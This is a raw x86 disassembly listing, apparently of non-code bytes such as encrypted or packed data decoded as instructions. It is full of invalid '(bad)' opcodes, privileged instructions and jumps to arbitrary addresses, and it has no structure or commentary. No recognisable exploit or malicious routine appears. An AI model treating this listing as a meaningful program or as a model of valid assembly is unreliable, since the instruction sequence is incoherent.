  412aed:	test   DWORD PTR [ebp+0x28],esp
  412af0:	cli    
  412af1:	adc    al,0x87
  412af3:	imul   ebx,DWORD PTR [ebp-0x64],0x26
  412af7:	adc    ah,BYTE PTR [ecx]
  412af9:	mov    cr5,esi
  412afc:	aam    0x14
  412afe:	scas   al,BYTE PTR es:[edi]
  412aff:	imul   esi,DWORD PTR [eax+0x3b],0x183b7360
  412b06:	test   dh,dl
  412b08:	es sbb eax,0x754eb496
  412b0e:	pusha  
  412b0f:	jb     0x412ac7
  412b11:	add    ecx,esp
  412b13:	or     DWORD PTR [ebx],0x73eeb69e
  412b19:	ins    BYTE PTR es:[edi],dx
  412b1a:	(bad)  
  412b1b:	xchg   edi,eax
  412b1c:	dec    ebp
  412b1d:	mul    BYTE PTR fs:[edi+0x4427dd82]
  412b24:	inc    ebx
  412b25:	mov    eax,0x8465b2e0
  412b2a:	outs   dx,DWORD PTR ds:[esi]
  412b2b:	ins    BYTE PTR es:[edi],dx
  412b2c:	xchg   BYTE PTR [eax],bl
  412b2e:	push   ds
  412b2f:	sahf   
  412b30:	xchg   BYTE PTR fs:[ebx+0x2f],cl
  412b34:	mov    al,BYTE PTR [esi]
  412b36:	push   ds
  412b37:	jl     0x412ad6
  412b39:	xor    edi,ebp
  412b3b:	mov    ah,0x90
  412b3d:	mul    BYTE PTR [ebp+0x4e]
  412b40:	adc    DWORD PTR [ecx-0x63],edx
  412b43:	mov    al,0x4b
  412b45:	inc    edi
  412b46:	pop    esi
  412b47:	loopne 0x412af3
  412b49:	jge    0x412b59
  412b4b:	sub    BYTE PTR [ecx],bh
  412b4d:	jb     0x412b73
  412b4f:	dec    esp
  412b50:	in     al,dx
  412b51:	and    esp,DWORD PTR [ecx]
  412b53:	sti    
  412b54:	jecxz  0x412b2b
  412b56:	add    BYTE PTR [esp+edi*8-0x46542b72],dh
  412b5d:	mov    edx,0xd827bae1
  412b62:	sbb    ebx,DWORD PTR [edi+0x2e]
  412b65:	jg     0x412b98
  412b67:	or     dh,BYTE PTR [eax+0x77ebe36]
  412b6d:	inc    ebp
  412b6e:	adc    al,0x56
  412b70:	fild   WORD PTR [ebp+edi*2-0x6f8d4fec]
  412b77:	xor    ebx,DWORD PTR [esi-0x26]
  412b7a:	retf   
  412b7b:	sti    
  412b7c:	das    
  412b7d:	inc    ebx
  412b7e:	pop    ebp
  412b7f:	call   0x68d676a1
  412b84:	dec    ecx
  412b85:	and    BYTE PTR [edx+ecx*8-0x1c],ch
  412b89:	push   0xffe19042
  412b8e:	xchg   edx,eax
  412b8f:	or     esp,DWORD PTR [eax]
  412b91:	sub    esi,DWORD PTR [ebx+0xf]
  412b94:	pop    es
  412b95:	push   ebp
  412b96:	pop    esi
  412b97:	and    ebx,eax
  412b99:	(bad)  
  412b9a:	cmc    
  412b9b:	mov    BYTE PTR [esi],dh
  412b9d:	jmp    FWORD PTR [ebp-0x6f]
  412ba0:	adc    DWORD PTR [edx-0x2acc4bf4],esp
  412ba6:	xchg   BYTE PTR [edx+0x19],bh
  412ba9:	dec    ebp
  412baa:	(bad)  
  412bab:	std    
  412bac:	add    al,0x7b
  412bae:	mov    edi,0xb9db35cb
  412bb3:	pop    ebx
  412bb5:	pop    es
  412bb6:	pop    ss
  412bb7:	std    
  412bb8:	repnz loopne 0x412c0a
  412bbb:	ins    BYTE PTR es:[edi],dx
  412bbc:	jmp    0xfb05:0x52a9a963
  412bc3:	jg     0x412b71
  412bc5:	mov    cl,0x96
  412bc7:	push   0xbea80588
  412bcc:	jno    0x412b76
  412bce:	sbb    ch,0xb5
  412bd1:	(bad)  [esi+0x22438730]
  412bd7:	xchg   esp,eax
  412bd8:	push   eax
  412bd9:	ret    
  412bda:	pop    ds
  412bdb:	inc    ebx
  412bdc:	lds    ebp,FWORD PTR [edi+0x3d1853f6]
  412be2:	retf   
  412be3:	fcom   QWORD PTR [ebx-0x67]
  412be6:	(bad)  
  412be7:	cld    
  412be8:	pushf  
  412be9:	out    dx,al
  412bea:	mov    esp,0x52367dac
  412bef:	push   0x1b
  412bf1:	push   edx
  412bf2:	push   0x9bfbb353
  412bf7:	call   0xea23:0x585bdcbc
  412bfe:	sub    ebx,eax
  412c00:	pop    ebp
  412c01:	cmp    ebx,DWORD PTR [ebp*8-0x74aab304]
  412c08:	mov    edx,0xcf06eb43
  412c0d:	fst    DWORD PTR [eax+0x60]
  412c10:	or     eax,0xfc5d16d1
  412c15:	shl    DWORD PTR cs:[edi],1
  412c18:	mov    WORD PTR [ecx],cs
  412c1a:	sbb    ebx,DWORD PTR [ecx]
  412c1c:	xor    BYTE PTR [esi+edi*1+0x6c682483],0x67
  412c24:	xchg   ebx,eax
  412c25:	mov    eax,ds:0x26fdf1e2
  412c2a:	stos   BYTE PTR es:[edi],al
  412c2b:	cmp    eax,0x869250bf
  412c30:	xor    al,0x31
  412c32:	inc    ecx
  412c33:	jmp    0x2e2a:0x8c445637
  412c3a:	xchg   ecx,eax
  412c3b:	ret    
  412c3c:	arpl   WORD PTR [ebx+ebp*1],bp
  412c3f:	stc    
  412c40:	cdq    
  412c41:	dec    ebx
  412c42:	jmp    0x2a3c07e0
  412c47:	sub    BYTE PTR [ebp+0x1ff3a46e],bl
  412c4d:	lea    edi,[ebx]
  412c4f:	les    esp,FWORD PTR [esi+0x36]
  412c52:	dec    esp
  412c53:	mov    ecx,0x66af37d9
  412c59:	dec    eax
  412c5a:	sub    DWORD PTR [eax+0x43],esi
  412c5d:	add    BYTE PTR [edx],bl
  412c5f:	add    al,BYTE PTR [ebp-0x3b]
  412c62:	fimul  DWORD PTR [ebp+0x5b]
  412c65:	stos   DWORD PTR es:[edi],eax
  412c66:	shl    ah,0xda
  412c69:	jmp    0x412cc0
  412c6b:	cmp    eax,0x96d7491a
  412c70:	iret   
  412c71:	dec    esp
  412c72:	mov    ds:0x5bb0a5bc,eax
  412c77:	shl    BYTE PTR [esi-0x1321ad60],0x12
  412c7e:	xchg   ecx,eax
  412c7f:	into   
  412c80:	sbb    al,0x9f
  412c82:	fs popa 
  412c84:	jns    0x412caf
  412c86:	stos   DWORD PTR es:[edi],eax
  412c87:	js     0x412cba
  412c89:	push   0x93281cf8
  412c8e:	int3   
  412c8f:	lods   eax,DWORD PTR ds:[esi]
  412c90:	sub    al,0x36
  412c92:	or     eax,esp
  412c94:	(bad)  [edx-0x5a]
  412c97:	div    BYTE PTR [edx-0x183a1ff]
  412c9d:	dec    ebx
  412c9e:	cmp    al,0x9a
  412ca0:	fs cdq 
  412ca2:	in     eax,0x15
  412ca4:	dec    eax
  412ca5:	and    DWORD PTR [edx],esi
  412ca7:	test   eax,0xf810ec4a
  412cac:	arpl   WORD PTR [ebx-0x5],bx
  412caf:	call   0x1e7b:0xd4ee1f72
  412cb6:	test   DWORD PTR [ebp-0x43],esp
  412cb9:	cmp    al,0xfa
  412cbb:	pop    edx
  412cbc:	fmul   DWORD PTR [edi-0x1e]
  412cbf:	(bad)  
  412cc0:	or     ebx,DWORD PTR [esi-0x7b1412f7]
  412cc6:	neg    edi
  412cc8:	mov    bh,0x4e
  412cca:	out    0x5,eax
  412ccc:	in     eax,0x64
  412cce:	lfs    edi,FWORD PTR ds:0xdc7a36ec
  412cd5:	div    DWORD PTR gs:[edi+0x52]
  412cd9:	dec    esi
  412cda:	clc    
  412cdb:	jne    0x412ceb
  412cdd:	xchg   ebp,eax
  412cde:	mov    es,WORD PTR [edi+0x27c26fea]
  412ce4:	adc    al,0x7c
  412ce6:	outs   dx,BYTE PTR ds:[esi]
  412ce7:	outs   dx,BYTE PTR ds:[esi]
  412ce8:	adc    dh,BYTE PTR [eax-0x4d]
  412ceb:	pop    DWORD PTR [edi]
  412ced:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cee:	call   0x45f8:0x9344ac28
  412cf5:	in     eax,0x57
  412cf7:	popf   
  412cf8:	and    eax,0x5aaa3217
  412cfd:	and    DWORD PTR [esi-0x6e28e2e4],esi
  412d03:	xchg   ebx,eax
  412d04:	xchg   esi,eax
  412d05:	jns    0x412ca0
  412d07:	mov    ebp,0xa4fc2aaa
  412d0c:	mov    DWORD PTR [esi],ebx
  412d0e:	mov    edi,0x2a8493a7
  412d13:	mov    bh,0xba
  412d15:	stos   BYTE PTR es:[edi],al
  412d16:	sub    esp,DWORD PTR [edi+0x7ed9ad75]
  412d1c:	and    ch,dh
  412d1e:	add    al,0x7b
  412d20:	leave  
  412d21:	adc    eax,0xec35763a
  412d26:	jne    0x412cb4
  412d28:	pop    eax
  412d29:	mov    esp,0x83a1914f
  412d2e:	retf   
  412d2f:	jge    0x412d90
  412d31:	xchg   ebp,eax
  412d32:	cli    
  412d33:	sbb    eax,0x1804257f
  412d38:	fimul  WORD PTR [edi-0x43454073]
  412d3e:	dec    eax
  412d3f:	cs xchg edx,eax
  412d41:	and    al,0xec
  412d43:	in     eax,dx
  412d44:	(bad)  
  412d45:	test   al,0x79
  412d47:	sub    DWORD PTR [ebx],eax
  412d49:	or     ch,bl
  412d4b:	fst    DWORD PTR [ebp+ebp*1-0x34]
  412d4f:	dec    esi
  412d50:	cld    
  412d51:	or     al,0x8
  412d53:	pop    ebx
  412d54:	mov    WORD PTR [edi-0x783c1434],cs
  412d5a:	adc    DWORD PTR [esi+0x5a],esi
  412d5d:	test   BYTE PTR [esi-0x17],bh
  412d60:	ins    DWORD PTR es:[edi],dx
  412d61:	test   BYTE PTR [ecx+0x1e],bl
  412d64:	inc    esi
  412d65:	add    eax,0x6c618869
  412d6a:	pop    ds
  412d6b:	cwde   
  412d6c:	jno    0x412d83
  412d6e:	xchg   edi,eax
  412d6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d70:	(bad)  
  412d71:	adc    eax,0x723d7b4a
  412d76:	(bad)  
  412d77:	rol    esp,1
  412d79:	pop    es
  412d7a:	test   eax,0xb2bcec8b
  412d7f:	sbb    dh,ah
  412d81:	enter  0x1554,0xc6
  412d85:	lea    edx,[ebx-0x78881995]
  412d8b:	jbe    0x412e04
  412d8d:	mov    ecx,0xf2ca5967
  412d92:	fisttp QWORD PTR [ebp+0x44]
  412d95:	xchg   ebx,eax
  412d96:	jns    0x412da3
  412d98:	aad    0x96
  412d9a:	ror    BYTE PTR ds:0xb4645f0f,1
  412da0:	test   DWORD PTR [ecx-0x59],edi
  412da3:	pop    ss
  412da4:	jo     0x412d88
  412da6:	pop    ebp
  412da7:	(bad)  
  412da8:	sar    DWORD PTR [ebp+0x64],cl
  412dab:	mov    bh,0x3d
  412dad:	ins    DWORD PTR es:[edi],dx
  412dae:	lods   al,BYTE PTR ds:[esi]
  412daf:	jbe    0x412dc1
  412db1:	or     cl,BYTE PTR [edi-0x64]
  412db4:	inc    ecx
  412db5:	push   eax
  412db6:	shl    dh,0xb0
  412db9:	pushf  
  412dba:	jns    0x412dc8
  412dbc:	jae    0x412d66
  412dbe:	xchg   edx,eax
  412dbf:	ret    
  412dc0:	das    
  412dc1:	sub    edx,DWORD PTR [ecx]
  412dc3:	inc    ebx
  412dc4:	out    dx,al
  412dc5:	mov    ah,0x3f
  412dc7:	imul   ebx,DWORD PTR [esi],0xc04668cf
  412dcd:	inc    cl
  412dcf:	cmp    al,0x41
  412dd1:	add    eax,0xb8db0998
  412dd6:	sti    
  412dd7:	jae    0x412e35
  412dd9:	xchg   DWORD PTR [ecx+0x2cef0ca5],ebx
  412ddf:	add    DWORD PTR [esi],ebx
  412de1:	jmp    0xa0f5bf8d
  412de6:	adc    ebx,DWORD PTR [eax-0x51]
  412de9:	jg     0x412e17
  412deb:	cmc    
  412dec:	push   cs
  412ded:	retf   0x82d6
  412df0:	inc    edi
  412df1:	and    ah,BYTE PTR [ebx+eax*2]
  412df4:	push   0x3d
  412df6:	cs mov dh,0x1d
  412df9:	loopne 0x412dea
  412dfb:	imul   edi,DWORD PTR [esi],0x67511ceb
  412e01:	inc    ebp
  412e02:	shl    BYTE PTR [ebx-0x61],1
  412e05:	add    al,0x24
  412e07:	push   ebp
  412e08:	sub    dl,0x59
  412e0b:	jnp    0x412e00
  412e0d:	cs gs jecxz 0x412e85
  412e11:	jno    0x412e2c
  412e13:	sbb    al,0xea
  412e15:	ins    BYTE PTR es:[edi],dx
  412e16:	inc    edi
  412e17:	test   DWORD PTR [ebx+eiz*4],ebp
  412e1a:	(bad)  
  412e1b:	retf   0x45eb
  412e1e:	retf   0x4e9a
  412e21:	scas   eax,DWORD PTR es:[edi]
  412e22:	sbb    edx,DWORD PTR [esi+ebp*8-0x31960173]
  412e29:	push   edi
  412e2a:	pop    ds
  412e2b:	outs   dx,BYTE PTR ds:[esi]
  412e2c:	loope  0x412df2
  412e2e:	sbb    eax,0xfb8cd87e
  412e33:	cmp    ebp,DWORD PTR [ebx+0x2b]
  412e36:	jne    0x412e59
  412e38:	dec    ebx
  412e39:	mov    ecx,0x747373e8
  412e3e:	arpl   WORD PTR [edx-0x3f],si
  412e41:	lods   eax,DWORD PTR ds:[esi]
  412e42:	ror    DWORD PTR [eax+0x70],1
  412e45:	outs   dx,BYTE PTR ds:[esi]
  412e46:	lods   eax,DWORD PTR ds:[esi]
  412e47:	imul   ebp,DWORD PTR [ecx+0x2496c9a1],0xffffff8d
  412e4e:	xchg   DWORD PTR [ebx+esi*2+0x56ac0e68],esp
  412e55:	push   esp
  412e56:	les    edx,FWORD PTR [esi]
  412e58:	xor    ebp,DWORD PTR [edi+0x26]
  412e5b:	div    DWORD PTR [edi]
  412e5d:	mov    ebx,0xe1a6108e
  412e62:	shr    DWORD PTR [ebp+eiz*2-0x4],1
  412e66:	js     0x412e71
  412e68:	jno    0x412e23
  412e6a:	pushf  
  412e6b:	fwait
  412e6c:	and    eax,0x9032a356
  412e71:	mov    esp,DWORD PTR [edx]
  412e73:	out    dx,al
  412e74:	imul   esi,DWORD PTR ss:0xb9d66644,0x7cebfd68
  412e7f:	cs push edi
  412e81:	xchg   ecx,eax
  412e82:	mov    esp,DWORD PTR [edx+0x21]
  412e85:	mov    bl,0x8b
  412e87:	pop    edx
  412e88:	sbb    eax,0xdaf37503
  412e8d:	dec    edx
  412e8e:	mov    edi,0x52e2c067
  412e93:	mov    bh,0x40
  412e95:	int3   
  412e96:	jo     0x412f0d
  412e98:	cmp    esp,DWORD PTR [edi]
  412e9a:	shl    BYTE PTR [ecx+0x76b635b9],1
  412ea0:	push   es
  412ea1:	fwait
  412ea2:	pop    edx
  412ea3:	push   DWORD PTR [eax+0x7b33af67]
  412ea9:	nop
  412eaa:	jb     0x412eeb
  412eac:	xchg   eax,edx
  412eae:	in     al,0x4
  412eb0:	syscall 
  412eb2:	std    
  412eb3:	cmp    ebp,DWORD PTR [esi]
  412eb5:	lds    edx,FWORD PTR [edx]
  412eb7:	sbb    BYTE PTR [esi+0x39],0xad
  412ebb:	jae    0x412ebf
  412ebd:	push   ds
  412ebe:	dec    edi
  412ebf:	mov    ecx,0xb884ef6f
  412ec4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ec5:	xor    eax,esp
  412ec7:	sbb    DWORD PTR [esi+ecx*1-0x3a98b1d8],ebx
  412ece:	shr    DWORD PTR [edi+0x2d],1
  412ed1:	lods   al,BYTE PTR ds:[esi]
  412ed2:	xchg   esi,eax
  412ed3:	mov    WORD PTR [ecx],ss
  412ed5:	data16 sti 
  412ed7:	je     0x412e96
  412ed9:	mov    ebx,0xaa2d48d9
  412ede:	push   ebx
  412edf:	or     BYTE PTR [esi+eiz*2-0x3b],0x63
  412ee4:	loop   0x412ea2
  412ee6:	dec    eax
  412ee7:	fmul   QWORD PTR [eax-0x32]
  412eea:	add    al,0x69
  412eec:	ret    0xa0d6
  412eef:	and    BYTE PTR [edi-0x48],0x60
  412ef3:	pop    edi
  412ef4:	pop    ebx
  412ef5:	mov    eax,0x5d946c9a
  412efa:	pop    es
  412efb:	dec    eax
  412efc:	push   ecx
  412efd:	add    BYTE PTR [edx],ah
  412eff:	outs   dx,BYTE PTR ds:[esi]
  412f00:	add    edx,DWORD PTR [ecx+0x3c]
  412f03:	and    WORD PTR [eax-0xcd29469],si
  412f0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f0b:	mov    edx,DWORD PTR [edx+0x18]
  412f0e:	mov    esi,0x1b9e2173
  412f13:	bts    DWORD PTR [eax+0x16],0xda
  412f18:	jb     0x412f74
  412f1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f1b:	out    0x83,eax
  412f1d:	push   edx
  412f1e:	sbb    cl,ah
  412f20:	test   dl,dh
  412f22:	nop
  412f23:	cmc    
  412f24:	jge    0x412f39
  412f26:	and    ah,dh
  412f28:	dec    eax
  412f29:	dec    eax
  412f2a:	jge    0x412f61
  412f2c:	xrelease mov BYTE PTR [eax],al
  412f2f:	jns    0x412f89
  412f31:	cmc    
  412f32:	sbb    bh,dh
  412f34:	repz out 0xff,eax
  412f37:	dec    esi
  412f38:	push   ds
  412f39:	int3   
  412f3a:	inc    ecx
  412f3b:	loope  0x412f38
  412f3d:	or     DWORD PTR [edi*4+0x1a505e33],ecx
  412f44:	mov    eax,0xe4d058a2
  412f49:	fnstsw ax
  412f4b:	xor    cl,0x93
  412f4e:	icebp  
  412f4f:	push   0x47
  412f51:	cs and al,0x91
  412f54:	jl     0x412fac
  412f56:	cbw    
  412f58:	das    
  412f59:	and    ch,0xd6
  412f5c:	mov    BYTE PTR [edx+esi*8+0x4370fb0c],bh
  412f63:	cmp    ecx,ecx
  412f65:	stos   DWORD PTR es:[edi],eax
  412f66:	(bad)  
  412f67:	iret   
  412f68:	lods   al,BYTE PTR ds:[esi]
  412f69:	jbe    0x412fa0
  412f6b:	leave  
  412f6c:	or     al,0xb9
  412f6e:	daa    
  412f6f:	pop    esi
  412f70:	xor    edi,ecx
  412f72:	pusha  
  412f73:	add    DWORD PTR [eax-0x79291cd],0xffffff91
  412f7a:	or     ebx,eax
  412f7c:	sub    eax,0x87464f23
  412f81:	in     eax,dx
  412f82:	add    eax,0x3b2fd4a7
  412f87:	jle    0x412fe9
  412f89:	and    bh,BYTE PTR ds:0x502db3de
  412f8f:	jle    0x412fb0
  412f91:	test   al,0xfd
  412f93:	sbb    BYTE PTR [ebp-0x2336b661],0x53
  412f9a:	mov    fs,WORD PTR [ecx-0x7065ec1e]
  412fa0:	(bad)  
  412fa1:	lahf   
  412fa2:	in     al,0xae
  412fa4:	out    dx,eax
  412fa5:	int    0x65
  412fa7:	test   DWORD PTR [ecx-0x6d],ebx
  412faa:	dec    eax
  412fab:	mov    edi,0xb55c5659
  412fb0:	cmp    esp,DWORD PTR [ebp-0x5b]
  412fb3:	mov    eax,ds:0x8138b51
  412fb8:	adc    al,bl
  412fba:	out    0x87,al
  412fbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fbd:	scas   al,BYTE PTR es:[edi]
  412fbe:	sbb    al,0xdb
  412fc0:	out    0xd6,eax
  412fc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fc3:	pop    es
  412fc4:	addr16 cld 
  412fc6:	test   DWORD PTR [esi-0x21],ecx
  412fc9:	fwait
  412fca:	rcl    DWORD PTR [eax],cl
  412fcc:	jae    0x412f79
  412fce:	dec    esp
  412fcf:	jle    0x413034
  412fd1:	inc    esp
  412fd2:	jge    0x412fe9
  412fd4:	test   eax,0x6796195a
  412fd9:	dec    esi
  412fda:	cmp    BYTE PTR [edi+eax*8+0x7b],dh
  412fde:	xchg   ecx,eax
  412fdf:	jp     0x412fb0
  412fe1:	mov    al,BYTE PTR [ebx+0x4e]
  412fe4:	cli    
  412fe5:	mov    ebx,DWORD PTR [edi-0x7ca423a3]
  412feb:	imul   ebp,DWORD PTR [edx+0x19],0xffffff81
  412fef:	fisttp QWORD PTR [ebx]
  412ff1:	retf   
  412ff2:	or     DWORD PTR [edx+0x34b94aab],edx
  412ff8:	cmp    al,0x89
  412ffa:	mov    ds:0x827e8b53,al
  412fff:	loopne 0x413025
  413001:	jge    0x412f95
  413003:	push   0xbf858df1
  413008:	adc    al,bh
  41300a:	inc    eax
  41300b:	sti    
  41300c:	sbb    al,0x3
  41300e:	scas   eax,DWORD PTR es:[edi]
  41300f:	fucomip st,st(5)
  413011:	inc    ecx
  413012:	(bad)  
  413013:	rol    BYTE PTR [ebx],1
  413015:	sub    bl,BYTE PTR ds:0x4c5a03bb
  41301b:	rol    BYTE PTR [eax+eax*2],1
  41301e:	lea    esi,[ecx]
  413020:	(bad)  
  413021:	mov    ecx,0x7658711c
  413026:	sub    bh,bl
  413028:	sbb    edi,DWORD PTR [eax+0x9]
  41302b:	xlat   BYTE PTR ds:[ebx]
  41302c:	shr    BYTE PTR [esi+0x58],0xd1
  413030:	std    
  413031:	fld    TBYTE PTR [eax-0x58834ece]
  413037:	inc    esi
  413038:	call   0x4b63:0x7ecff4cd
  41303f:	sti    
  413040:	aas    
  413041:	inc    ebx
  413042:	mov    bh,0x90
  413044:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413045:	mov    esi,0xb3882f08
  41304a:	pop    ebp
  41304b:	inc    edi
  41304c:	fiadd  WORD PTR [esi]
  41304e:	test   eax,0x82b56005
  413053:	mov    ds:0x39a67348,eax
  413058:	inc    edi
  413059:	mov    gs,WORD PTR [ecx-0x49f48a62]
  41305f:	iret   
  413060:	cwde   
  413061:	mov    esi,0x6a257dfe
  413066:	xor    eax,0x26fd2c0a
  41306b:	mov    dh,0x81
  41306e:	jb     0x4130e6
  413070:	(bad)  
  413071:	test   DWORD PTR ds:0x913be942,0xabaa4b2f
  41307b:	xchg   edx,eax
  41307c:	enter  0xf636,0xbc
  413080:	lock jb 0x413005
  413083:	inc    edi
  413084:	cmc    
  413085:	sub    DWORD PTR [ebx-0x7a],ebp
  413088:	mov    edx,0x625934fe
  41308d:	sbb    ecx,eax
  41308f:	cmp    esp,DWORD PTR [edx-0x42]
  413092:	(bad)  
  413093:	popf   
  413094:	dec    BYTE PTR [ecx+eax*8]
  413097:	sbb    dl,BYTE PTR [ebx-0xe]
  41309a:	in     eax,0x14
  41309c:	push   esp
  41309d:	dec    edx
  41309e:	or     al,0x9b
  4130a0:	test   BYTE PTR [ebx+esi*1-0x7a26b590],dh
  4130a7:	dec    edx
  4130a8:	xlat   BYTE PTR ds:[ebx]
  4130a9:	adc    DWORD PTR [edx+0x43861d6e],ebp
  4130af:	add    esi,edx
  4130b1:	push   0xfffffffe
  4130b3:	hlt    
  4130b4:	mov    bl,0x70
  4130b6:	mov    cl,0x2c
  4130b8:	or     eax,0xc97a6720
  4130bd:	sbb    al,0x79
  4130bf:	sub    al,0x34
  4130c1:	or     DWORD PTR [ecx-0x54],eax
  4130c4:	cmp    ebp,DWORD PTR [esi-0x6f3fb35f]
  4130ca:	jle    0x4130b5
  4130cc:	stc    
  4130cd:	fistp  WORD PTR [esi+0x3aff8b59]
  4130d3:	jecxz  0x41310d
  4130d5:	xor    eax,0xaa6b0921
  4130da:	push   ebp
  4130db:	loop   0x413074
  4130dd:	scas   eax,DWORD PTR es:[edi]
  4130de:	jge    0x413073
  4130e0:	fnsave [esi]
  4130e2:	inc    esi
  4130e3:	jne    0x4130f9
  4130e5:	xor    ebp,DWORD PTR [eax+eiz*1]
  4130e8:	mov    esi,DWORD PTR [edx+0x6a]
  4130eb:	push   es
  4130ec:	xor    BYTE PTR [edi+0x6e18c37a],0xce
  4130f3:	std    
  4130f4:	mov    al,0x8a
  4130f6:	sahf   
  4130f7:	push   cs
  4130f8:	sub    bl,BYTE PTR [ebx-0x4974bdb8]
  4130fe:	hlt    
  4130ff:	pop    esp
  413100:	and    ah,BYTE PTR [esi]
  413102:	(bad)  
  413103:	iret   
  413104:	cmc    
  413105:	add    al,0xa0
  413107:	call   DWORD PTR [edi+0x6d]
  41310a:	outs   dx,BYTE PTR ds:[esi]
  41310b:	or     eax,0x98cb0a91
  413110:	or     DWORD PTR [edx],ebp
  413112:	fwait
  413113:	(bad)  
  413114:	push   0x9f501bb8
  413119:	push   esi
  41311a:	xor    al,0x37
  41311c:	pop    eax
  41311d:	aam    0xf9
  41311f:	or     dh,BYTE PTR [esi+0x3b]
  413122:	sar    BYTE PTR [edx-0xa],cl
  413125:	mov    bh,0x2f
  413127:	aas    
  413128:	mov    esp,0x64e639b8
  41312d:	dec    ecx
  41312e:	cmp    edx,DWORD PTR [edx]
  413130:	data16 fild QWORD PTR [eax+0x76]
  413134:	enter  0x8bed,0xc5
  413138:	adc    esi,0xaf4789da
  41313e:	pop    esp
  41313f:	mov    ebp,0xea39005e
  413144:	repnz es pop eax
  413147:	sbb    eax,0x752b9ea
  41314c:	sysret 
  41314e:	shr    DWORD PTR [ecx],cl
  413150:	and    BYTE PTR [ecx-0x66],dl
  413153:	mov    cs,WORD PTR [edx+0x4c]
  413156:	cs popf 
  413158:	xor    ah,cl
  41315a:	scas   al,BYTE PTR es:[edi]
  41315b:	pop    edx
  41315c:	mov    cl,0x54
  41315e:	xor    DWORD PTR [ebx+0x6f],ebx
  413161:	das    
  413162:	jno    0x413132
  413164:	pop    esp
  413165:	rol    cl,cl
  413167:	cld    
  413168:	push   ebp
  413169:	popa   
  41316a:	pop    ebx
  41316b:	addr16 fsqrt 
  41316e:	xor    DWORD PTR [esi+0x2d],0xffffffc0
  413172:	adc    dl,BYTE PTR ds:0xd482086d
  413178:	repz aad 0x62
  41317b:	int3   
  41317c:	inc    edi
  41317d:	push   edi
  41317e:	repnz stos BYTE PTR es:[edi],al
  413180:	cwde   
  413181:	sub    al,0xc4
  413183:	sub    eax,0xe80dbca4
  413188:	loopne 0x4131e9
  41318a:	add    BYTE PTR [ecx],bh
  41318c:	xchg   ebx,eax
  41318d:	ja     0x4131b0
  41318f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413190:	inc    esp
  413191:	add    al,0x66
  413193:	test   al,0x59
  413195:	mov    dl,0x96
  413197:	jmp    FWORD PTR [ecx-0x29]
  41319a:	cwde   
  41319b:	jno    0x4131a4
  41319d:	outs   dx,DWORD PTR ds:[esi]
  41319e:	mov    ds:0xf957718,eax
  4131a3:	jo     0x41316f
  4131a5:	xor    eax,0x91215c71
  4131aa:	(bad)  
  4131ab:	int    0x61
  4131ad:	lds    ecx,FWORD PTR [ecx-0x39]
  4131b0:	aas    
  4131b1:	adc    dl,BYTE PTR [ecx]
  4131b3:	mov    ebp,0x41eccdfc
  4131b8:	mov    cs,WORD PTR [esi]
  4131ba:	(bad)  
  4131bb:	xchg   edx,eax
  4131bc:	mov    ds:0xe934ab37,al
  4131c1:	sbb    BYTE PTR [edx-0x29],bl
  4131c4:	les    ecx,FWORD PTR [ecx-0x35cd412a]
  4131ca:	sbb    ah,BYTE PTR [ecx]
  4131cc:	test   bl,0xa0
  4131cf:	inc    esp
  4131d0:	mov    esi,0x835aed70
  4131d5:	stos   BYTE PTR es:[edi],al
  4131d6:	mov    DWORD PTR [ebp-0xec12ca7],esi
  4131dc:	div    ebp
  4131de:	sub    bh,al
  4131e0:	mov    dl,0x79
  4131e2:	dec    eax
  4131e3:	push   ebx
  4131e4:	pop    edi
  4131e5:	cwde   
  4131e6:	inc    eax
  4131e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131e8:	xchg   DWORD PTR [ecx-0x1f],ecx
  4131eb:	push   esi
  4131ec:	or     BYTE PTR [edx-0x1d],ch
  4131ef:	outs   dx,BYTE PTR ds:[esi]
  4131f0:	adc    DWORD PTR [edx-0x9],esi
  4131f3:	test   eax,0xd92ab262
  4131f8:	pusha  
  4131f9:	inc    edi
  4131fa:	(bad)  
  4131fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131fc:	mov    dl,0x1f
  4131fe:	in     al,0x76
  413200:	das    
  413201:	lods   eax,DWORD PTR ds:[esi]
  413202:	ficomp DWORD PTR [esi-0x39]
  413205:	jle    0x413187
  413207:	ss aam 0xca
  41320a:	mov    al,0xfb
  41320c:	les    esi,FWORD PTR [edx]
  41320e:	imul   ebp,DWORD PTR [ebp-0x6977620c],0x16eb9ea5
  413218:	pop    esp
  413219:	sbb    DWORD PTR [edx+0x5c7ba85f],edi
  41321f:	jno    0x413247
  413221:	ins    DWORD PTR es:[edi],dx
  413222:	out    0x1,eax
  413224:	push   ebx
  413225:	jmp    0x3787ab7e
  41322a:	xor    dl,BYTE PTR [ebp+eiz*2+0x71]
  41322e:	push   0xffffffff
  413230:	fcmovne st,st(6)
  413232:	inc    ebp
  413233:	iret   
  413234:	or     ch,BYTE PTR [esi]
  413236:	ins    BYTE PTR es:[edi],dx
  413237:	cmp    edx,0x11
  41323a:	cmp    dl,BYTE PTR ds:0xfcf881d5
  413240:	xchg   edi,eax
  413241:	jnp    0x413214
  413243:	inc    edx
  413244:	in     al,0xc9
  413246:	push   ecx
  413247:	push   cs
  413248:	iret   
  413249:	push   ecx
  41324a:	test   eax,0xfd4de6fb
  41324f:	ret    0x45c4
  413252:	xchg   ebp,eax
  413253:	enter  0x7add,0xd
  413257:	push   edx
  413258:	jno    0x4132c0
  41325a:	mov    bl,0x2b
  41325c:	xor    eax,0xd5c2d419
  413261:	mov    WORD PTR [edi-0x77dbbe9a],es
  413267:	rol    DWORD PTR [esi-0x37],cl
  41326a:	clc    
  41326b:	ins    BYTE PTR es:[edi],dx
  41326c:	fs pop ds
  41326e:	scas   al,BYTE PTR es:[edi]
  41326f:	ja     0x413243
  413271:	xor    al,BYTE PTR [edx-0x35]
  413274:	adc    eax,0x444ab06
  413279:	jo     0x41326d
  41327b:	lds    edi,FWORD PTR [ebp-0x3e8bfe42]
  413281:	sbb    ah,BYTE PTR [eax+esi*2+0x2a3f9fa7]
  413288:	daa    
